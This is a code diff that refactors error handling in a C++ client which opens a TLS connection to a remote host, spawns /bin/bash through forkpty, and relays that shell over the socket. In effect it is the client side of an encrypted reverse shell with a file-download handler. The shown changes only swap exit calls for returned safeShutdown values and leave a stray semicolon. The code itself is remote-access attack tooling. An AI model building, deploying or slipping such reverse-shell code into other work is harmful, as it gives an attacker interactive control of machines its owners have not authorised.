@@ -23,13 +23,12 @@ inline fileTransfer c_handleDownloadRequest(SSL* ssl) {
     return transferCfg;
 }
 
-inline void client(const std::string &ipAddr, unsigned int portNum) {
+inline int client(const std::string &ipAddr, unsigned int portNum) {
 
     int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
 
     if (clientSocket < 0) {
-        perror("[!] Failed to create client socket");
-        exit(1);
+        return safeShutdown("[!] Failed to create client socket", clientSocket, 0, nullptr, nullptr);
     }
 
     // socket info
@@ -44,10 +43,8 @@ inline void client(const std::string &ipAddr, unsigned int portNum) {
 
     std::cout << "[!] Connected to server!" << std::endl;
 
-    if (connection < 0) {
-        perror("[!] Failed to connect to server");
-        close(clientSocket);
-        exit(-1);
+    if (connection < 0) {;
+        return safeShutdown("[!] Failed to connect to server", clientSocket, 0, nullptr, nullptr);
     }
 
     // as of openssl 1.1.0, openssl can allocate all resources required (error strings, etc)
@@ -70,11 +67,11 @@ inline void client(const std::string &ipAddr, unsigned int portNum) {
     pid_t childPid = forkpty(&masterFd, nullptr, nullptr, nullptr);
 
     if (childPid < 0) {
-        safeShutdown("[!] Fork failed to create! ", clientSocket, masterFd, ssl, ctx);
+        return safeShutdown("[!] Fork failed to create! ", clientSocket, masterFd, ssl, ctx);
     }
     if (childPid == 0) {
         execl("/bin/bash", "bash", nullptr);
-        safeShutdown("[!] Execl failed!", clientSocket, masterFd, ssl, ctx);
+        return safeShutdown("[!] Execl failed!", clientSocket, masterFd, ssl, ctx);
     }
 
     fd_set fds;
@@ -157,7 +154,7 @@ inline void client(const std::string &ipAddr, unsigned int portNum) {
         }
     }
 
-   safeShutdown("[!] Shutting down!", clientSocket, masterFd, ssl, ctx);
+   return safeShutdown("[!] Shutting down!", clientSocket, masterFd, ssl, ctx);
 }
 
 
